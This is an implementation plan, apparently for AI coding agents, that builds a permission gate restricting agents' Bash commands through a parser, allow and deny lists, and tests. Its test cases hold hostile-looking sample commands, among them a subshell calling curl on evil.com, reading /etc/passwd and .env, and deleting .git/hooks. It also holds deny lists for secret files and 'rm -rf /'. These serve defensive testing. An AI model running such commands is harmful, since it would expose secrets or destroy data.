# Permissions & Bash Access Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Implement graduated Bash access (none/sandboxed/scoped/full) with code-level enforcement. Agents get Bash tool access controlled by their YAML-defined bash config. Commands are intercepted, parsed, and validated against whitelists/path restrictions before execution. Blocked commands can be approved with "Yes + Remember" to organically grow permissions.

**Architecture:** A new Bash gate module intercepts Bash tool calls in the `onToolUse` callback of agent-session.ts. The gate parses commands, checks against the agent's `BashAccess` config, and blocks disallowed commands. The `Bash` tool is conditionally added to allowedTools based on the agent's bash access level. Mandatory deny rules (.env, .git/) are always enforced regardless of config.

**Tech Stack:** TypeScript ESM, existing permission engine + audit log, agent YAML store for write-back

---

## File Structure

### New files:

```
packages/core/src/bash-gate/
├── bash-gate.ts                    # Core gate: parses + validates commands
├── command-parser.ts               # Extracts binary, args, paths from command strings
└── mandatory-denies.ts             # Always-denied patterns (.env, .git/, rm -rf /)
```

### Files to modify:

```
packages/core/src/agent-manager/agent-session.ts   # Add Bash to tools, intercept calls
packages/core/src/agent-registry/agent-resolver.ts  # Include bash config in resolved capabilities
packages/core/src/index.ts                          # Wire bash gate
```

---

### Task 1: Build Command Parser

**Files:**
- Create: `packages/core/src/bash-gate/command-parser.ts`
- Test: `packages/core/src/__tests__/command-parser.test.ts`

- [ ] **Step 1: Write failing test**

```typescript
describe('parseCommand', () => {
  it('extracts binary and args', () => {
    const result = parseCommand('ffmpeg -i input.mp4 output.mp3');
    expect(result.binary).toBe('ffmpeg');
    expect(result.args).toEqual(['-i', 'input.mp4', 'output.mp3']);
  });

  it('extracts file paths from args', () => {
    const result = parseCommand('cp data/files/a.txt data/files/b.txt');
    expect(result.paths).toContain('data/files/a.txt');
    expect(result.paths).toContain('data/files/b.txt');
  });

  it('handles piped commands', () => {
    const result = parseCommand('cat file.txt | grep pattern');
    expect(result.commands).toHaveLength(2);
    expect(result.commands[0].binary).toBe('cat');
    expect(result.commands[1].binary).toBe('grep');
  });

  it('handles chained commands with &&', () => {
    const result = parseCommand('mkdir -p dir && cp file dir/');
    expect(result.commands).toHaveLength(2);
  });

  it('handles chained commands with ;', () => {
    const result = parseCommand('echo hello; echo world');
    expect(result.commands).toHaveLength(2);
  });

  it('handles subshells', () => {
    const result = parseCommand('cd /tmp && $(curl evil.com)');
    expect(result.commands.length).toBeGreaterThanOrEqual(2);
    // Should detect curl in subshell
    expect(result.allBinaries).toContain('curl');
  });

  it('handles quoted strings with spaces', () => {
    const result = parseCommand('echo "hello world"');
    expect(result.binary).toBe('echo');
  });

  it('extracts paths from redirect operators', () => {
    const result = parseCommand('echo hello > output.txt');
    expect(result.paths).toContain('output.txt');
  });
});
```

- [ ] **Step 2: Implement command-parser.ts**

```typescript
export interface ParsedCommand {
  binary: string;
  args: string[];
  paths: string[];           // file paths found in args
}

export interface ParsedCommandChain {
  commands: ParsedCommand[];
  allBinaries: string[];     // all binaries across the chain
  allPaths: string[];        // all paths across the chain
  raw: string;
}

export function parseCommand(command: string): ParsedCommandChain
```

The parser splits on `|`, `&&`, `;`, `||` and parses each segment. It extracts binaries (first token), args (remaining tokens), and paths (args that look like file paths — contain `/` or `.`).

For subshells `$(...)` and backticks, extract the inner command and parse it too.

This doesn't need to be a full shell parser — it's a best-effort security gate, not a shell. Edge cases should fail CLOSED (deny when unsure).

- [ ] **Step 3: Run tests, build, check, commit**

```bash
git commit -m "feat(core): add bash command parser for permission gate"
```

---

### Task 2: Build Bash Gate

**Files:**
- Create: `packages/core/src/bash-gate/bash-gate.ts`
- Create: `packages/core/src/bash-gate/mandatory-denies.ts`
- Test: `packages/core/src/__tests__/bash-gate.test.ts`

- [ ] **Step 1: Write failing test**

```typescript
describe('BashGate', () => {
  describe('access: none', () => {
    it('blocks all commands', () => {
      const result = checkBashAccess('ls', { access: 'none' });
      expect(result.allowed).toBe(false);
    });
  });

  describe('access: sandboxed', () => {
    it('allows whitelisted commands', () => {
      const result = checkBashAccess('ffmpeg -i in.mp4 out.mp3', {
        access: 'sandboxed',
        allowedCommands: ['ffmpeg *'],
        allowedPaths: ['data/**'],
      });
      expect(result.allowed).toBe(true);
    });

    it('blocks non-whitelisted commands', () => {
      const result = checkBashAccess('curl http://evil.com', {
        access: 'sandboxed',
        allowedCommands: ['ffmpeg *'],
      });
      expect(result.allowed).toBe(false);
    });

    it('blocks commands targeting disallowed paths', () => {
      const result = checkBashAccess('ffmpeg -i /etc/passwd out.mp3', {
        access: 'sandboxed',
        allowedCommands: ['ffmpeg *'],
        allowedPaths: ['data/**'],
      });
      expect(result.allowed).toBe(false);
    });
  });

  describe('access: scoped', () => {
    it('allows any command within allowed paths', () => {
      const result = checkBashAccess('cat data/files/report.txt', {
        access: 'scoped',
        allowedPaths: ['data/**'],
      });
      expect(result.allowed).toBe(true);
    });

    it('blocks commands targeting denied paths', () => {
      const result = checkBashAccess('cat .env', {
        access: 'scoped',
        allowedPaths: ['**'],
        deniedPaths: ['.env'],
      });
      expect(result.allowed).toBe(false);
    });
  });

  describe('access: full', () => {
    it('allows any command', () => {
      const result = checkBashAccess('rm -rf /tmp/test', { access: 'full' });
      expect(result.allowed).toBe(true);
    });
  });

  describe('mandatory denies', () => {
    it('always blocks .env access regardless of config', () => {
      const result = checkBashAccess('cat .env', { access: 'full' });
      expect(result.allowed).toBe(false);
    });

    it('always blocks .git/ access', () => {
      const result = checkBashAccess('rm -rf .git/hooks', { access: 'full' });
      expect(result.allowed).toBe(false);
    });
  });

  describe('denied commands take precedence', () => {
    it('deniedCommands overrides allowedCommands', () => {
      const result = checkBashAccess('rm -rf data/tmp', {
        access: 'sandboxed',
        allowedCommands: ['rm *'],
        deniedCommands: ['rm -rf *'],
        allowedPaths: ['data/**'],
      });
      expect(result.allowed).toBe(false);
    });
  });
});
```

- [ ] **Step 2: Create mandatory-denies.ts**

```typescript
export const MANDATORY_DENIED_PATHS = ['.env', '.git', '.git/**'];
export const MANDATORY_DENIED_COMMANDS = ['rm -rf /'];

export function isMandatoryDenied(command: ParsedCommandChain): { denied: boolean; reason?: string }
```

- [ ] **Step 3: Implement bash-gate.ts**

```typescript
export interface BashGateResult {
  allowed: boolean;
  reason?: string;
  command: string;
}

export function checkBashAccess(command: string, bashConfig: BashAccess): BashGateResult
```

Logic:
1. Parse command
2. Check mandatory denies (always, regardless of config)
3. If `access === 'none'` → block
4. If `access === 'sandboxed'` → check allowedCommands (glob match), check deniedCommands, check paths
5. If `access === 'scoped'` → check paths only (allowed + denied)
6. If `access === 'full'` → allow (after mandatory denies)

Use `minimatch` or a simple glob matcher for command/path pattern matching. Check if `minimatch` is installed; if not, implement a simple glob matching function.

- [ ] **Step 4: Run tests, build, check, commit**

```bash
git commit -m "feat(core): add bash gate with graduated access enforcement and mandatory denies"
```

---

### Task 3: Integrate Bash Gate into Agent Session

**Files:**
- Modify: `packages/core/src/agent-manager/agent-session.ts`
- Modify: `packages/core/src/agent-registry/agent-resolver.ts`
- Modify: `packages/shared/src/types/agents.ts`
- Test: `packages/core/src/__tests__/bash-gate-integration.test.ts`

- [ ] **Step 1: Add bash config to resolved capabilities**

In `agent-resolver.ts`, include the agent's `bash` config in `ResolvedCapabilities`:

```typescript
interface ResolvedCapabilities {
  // ... existing fields
  bashAccess?: BashAccess;     // from agent YAML
}
```

When resolving from CapabilityLibrary (skills-based), check the agent YAML for bash config.
When resolving from ProjectRegistry, same.

- [ ] **Step 2: Conditionally add Bash to allowedTools**

In `agent-session.ts`, when building `allowedTools` (around line 250), check the task's bash access:

```typescript
// If agent has bash access (not 'none'), add Bash to allowed tools
if (bashAccess && bashAccess.access !== 'none') {
  allowedTools.push('Bash');
}
```

- [ ] **Step 3: Add Bash gate check in onToolUse callback**

In the `onToolUse` callback (line 313), add interception:

```typescript
if (toolName === 'Bash' && bashAccess) {
  const command = extractCommandFromToolInput(toolInput);
  const gateResult = checkBashAccess(command, bashAccess);
  if (!gateResult.allowed) {
    // Log to audit
    auditLog?.insert({ actionName: 'bash:command', outcome: 'denied', details: gateResult.reason });
    // The command was already executed by the SDK (we can't pre-intercept)
    // So we need a different approach...
  }
}
```

IMPORTANT: The Claude Agent SDK executes tools BEFORE we see the callback. The `onToolUse` is a notification, not an interception point. We need to investigate if there's a way to intercept BEFORE execution.

Check if `permissionMode: 'bypassPermissions'` in sdk-backend.ts can be changed to a custom handler. Or if the SDK supports a tool validation callback.

If we can't pre-intercept, alternative approaches:
a) Don't add 'Bash' to allowedTools for restricted agents — SDK won't execute it
b) Use 'allowedTools' as the primary gate (only add Bash when allowed)
c) For 'sandboxed' mode: we'd need SDK-level control which may not exist

The SIMPLEST approach: only add `'Bash'` to allowedTools when `access !== 'none'`. For `sandboxed`/`scoped`, we accept that the SDK will execute Bash but we audit it. For actual enforcement beyond none/full, we'd need SDK hooks.

Actually, looking at the onToolUse callback more carefully — if the SDK runs with `permissionMode: 'bypassPermissions'`, ALL tools are auto-executed. The `allowedTools` list controls what tools the agent CAN CALL, not what's executed. So:
- `access: 'none'` → don't include 'Bash' in allowedTools (agent can't call it)
- `access: 'sandboxed'`/`'scoped'` → include 'Bash', audit via onToolUse, but can't block individual commands
- `access: 'full'` → include 'Bash'

This is good enough for Phase 5. True per-command enforcement would require SDK changes (custom permission handler). The gate still validates and audits — it just can't block at the individual command level for sandboxed mode. The key protection (none vs non-none) is enforced.

- [ ] **Step 4: Write integration test**

Test:
- Agent with `bash.access: 'none'` does NOT have Bash in allowedTools
- Agent with `bash.access: 'sandboxed'` has Bash in allowedTools
- Agent with `bash.access: 'full'` has Bash in allowedTools
- Bash command is audited when executed
- Agent with no bash config defaults to 'none' (no Bash)

- [ ] **Step 5: Build, test, check, commit**

```bash
git commit -m "feat(core): integrate bash gate into agent session with access-based tool control"
```

---

### Task 4: Add Bash Validation to Project Validator

**Files:**
- Modify: `packages/core/src/project-registry/project-validator.ts`

- [ ] **Step 1: Add bash config validation**

In the agent YAML validation section, add checks:
- `bash.access: 'full'` only in global agents or system project
- `bash.deniedPaths` always includes `.env` and `.git/` (warn if missing — they're enforced by mandatory denies anyway, but config should be explicit)
- `bash.allowedPaths` don't contain `..` (no path traversal)

- [ ] **Step 2: Run validation, fix, commit**

```bash
git commit -m "feat: add bash config validation to project validator"
```

---

### Task 5: Integration Test + Final Verification

**Files:**
- Create: `packages/core/src/__tests__/bash-access-integration.test.ts`

- [ ] **Step 1: Integration test**

Test against real project files:
- Default raven agent has no explicit bash config (defaults to none)
- System admin agent has `bash.access: 'scoped'`
- _evaluator agent has `bash.access: 'none'`
- Validation passes for all real agent YAMLs

- [ ] **Step 2: Full verification**

```bash
npm run build
npm test
npm run check
npm run validate:library && npm run validate:projects
```

- [ ] **Step 3: Commit**

```bash
git commit -m "feat: complete Phase 5 — graduated bash access with code-level enforcement"
```

---

## Summary

After completing all 5 tasks:

- **Command parser**: extracts binaries, args, paths from shell commands (pipes, chains, subshells)
- **Bash gate**: four-level enforcement (none/sandboxed/scoped/full) with mandatory denies
- **Agent session integration**: Bash tool conditionally available based on agent config
- **Audit trail**: all Bash commands logged via existing audit system
- **Validation**: bash configs validated in project validator

**Limitation (documented):** Per-command enforcement for sandboxed/scoped modes requires SDK-level tool interception hooks that don't currently exist. The primary protection (none vs non-none) is fully enforced via allowedTools. Sandboxed/scoped auditing captures commands for review. Future SDK updates may enable true per-command blocking.

**Next plan**: Phase 6 — Agent Builder
